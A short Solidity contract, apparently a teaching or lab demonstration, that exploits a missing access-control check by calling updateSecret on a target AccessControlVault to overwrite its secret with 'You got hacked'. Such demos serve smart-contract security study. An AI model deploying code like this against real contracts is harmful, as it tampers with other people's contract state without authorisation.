contract Attacker {
    AccessControlVault target;

    constructor(address _target) {
        target = AccessControlVault(_target);
    }

    function overwriteSecret() public {
        target.updateSecret("You got hacked 😈");
    }
}
